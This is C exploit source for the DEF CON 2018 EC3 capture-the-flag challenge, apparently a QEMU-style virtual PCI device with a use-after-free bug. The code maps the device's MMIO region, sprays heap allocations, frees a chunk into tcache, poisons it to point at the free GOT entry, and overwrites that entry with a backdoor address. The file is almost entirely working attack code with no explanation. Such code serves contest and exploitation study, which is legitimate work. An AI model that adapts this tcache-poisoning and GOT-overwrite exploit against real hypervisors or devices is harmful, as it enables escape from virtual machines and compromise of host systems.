/*
Author: raycp
File: exp.c
Description: exp for defcon 2018 EC3, uaf vuln with no symbols
Date: 2019-08-16
*/

#include <assert.h>
#include <fcntl.h>
#include <inttypes.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <unistd.h>
#include<sys/io.h>

unsigned char* mmio_mem;

void die(const char* msg)
{
    perror(msg);
    exit(-1);
}


void mmio_write(uint64_t addr, uint64_t value)
{
    *((uint32_t*)(mmio_mem + addr)) = value;
}

uint64_t mmio_read(uint32_t addr)
{
    return *((uint32_t*)(mmio_mem + addr));
}

void mmio_malloc(uint8_t idx, uint32_t size)
{
    size = size/8;

    uint32_t addr=(idx<<16)|(0<<20);
    uint32_t value=size;
    mmio_write(addr,value);
}

void mmio_free(uint8_t idx)
{
    uint32_t addr=(idx<<16)|0x100000;
    uint32_t value=0;
    
    mmio_write(addr, value);
}

void mmio_edit(uint8_t idx, uint16_t offset, uint32_t data)
{
    uint32_t addr=(idx<<16)|(0x200000)|(offset);
    uint32_t value =  data;

    mmio_write(addr, value);
}

int main(int argc, char *argv[])
{

    
    uint32_t backdoor_addr = 0x6E65F9;
    int i;
    // Open and map I/O memory for the strng device
    int mmio_fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR | O_SYNC);
    if (mmio_fd == -1)
        die("mmio_fd open failed");

    mmio_mem = mmap(0, 0x1000000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);
    if (mmio_mem == MAP_FAILED)
        die("mmap mmio_mem failed");

    printf("mmio_mem @ %p\n", mmio_mem);
    
    printf("step1 malloc a chunk\n");
    //system("pause");
    mmio_malloc(0,0x370);
    for (i=1; i<1000;i++)
        mmio_malloc(1,0x370);
    //mmio_malloc(1,0x60);
    //sleep(1); 
    printf("step2 free the chunk to tcache\n");
    mmio_free(0);
    //sleep(1);
    printf("step3 edit the freed chunk\n");
    uint32_t free_got=0x11301A0;
    mmio_edit(0,0,free_got);
    
    mmio_malloc(1,0x370);
    mmio_malloc(1,0x370);
    //mmio_malloc(1,0x60);

    //for (i=0; i<15;i++) 
    mmio_edit(1,0,backdoor_addr);
    mmio_edit(1,4,0);

    mmio_free(0);


}
